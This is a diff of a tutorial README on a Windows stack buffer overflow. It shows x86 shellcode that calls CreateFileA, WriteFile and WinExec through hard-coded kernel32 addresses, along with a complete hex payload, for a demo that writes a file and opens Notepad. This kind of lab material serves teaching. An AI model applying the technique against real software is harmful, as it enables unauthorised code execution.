@@ -136,7 +136,9 @@ int main()
     return 0;
 }
 ```
+
 ![Alt text](https://github.com/kirleo2/bufferoverflow-attack/blob/main/Screenshots/addr.png?raw=true "Addresses")
+
 * Roughly exploit code in C
 ```C
 #include <windows.h>
@@ -154,7 +156,9 @@ int main() {
 ```
 - After finding out the addresses of the necessary instructions, it is possible to write the code in assembler.
 * To find out instruction encoding, we can use OllyDbg. With double-clicking on any instruction we can change it and see the new encoding.
+
 ![Alt text](https://github.com/kirleo2/bufferoverflow-attack/blob/main/Screenshots/encoding.png?raw=true "OllyDbg")
+
 ``` Assembly x86
 BA 00389A75    MOV EDX,KERNEL32.CreateFileA   
 // push „output.txt“
@@ -209,6 +213,7 @@ BA F0E19D75    MOV EDX,KERNEL32.WinExec
 
 - Now we have hexadicimal code of out exploit 30 31 32 33 34 35 36 37 38 39 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 30 FF 19 00 BA 00 38 9A 75 68 78 74 00 00 68 75 74 2E 74 68 6F 75 74 70 8B CC 6A 00 68 80 00 00 00 6A 02 6A 00 6A 00 68 00 00 00 40 51 FF D2 68 6F 6F 6C 00 68 69 73 20 63 68 6C 6F 77 20 68 76 65 72 66 68 65 72 20 6F 68 42 75 66 66 8B CC 68 78 56 34 12 8B FC 50 6A 00 57 6A 18 51 50 BA 80 3C 9A 75 FF D2 58 50 BA B0 35 9A 75 FF D2 BA F0 E1 9D 75 68 78 74 00 00 68 75 74 2E 74 68 6F 75 74 70 68 65 78 65 20 68 70 61 64 2E 68 6E 6F 74 65 8B CC 6A 05 51 FF D2
 * that we can write to the file using any hex editor. For example HxD program.
+
 ![Alt text](https://github.com/kirleo2/bufferoverflow-attack/blob/main/Screenshots/hex.png?raw=true "HxD")
 
 
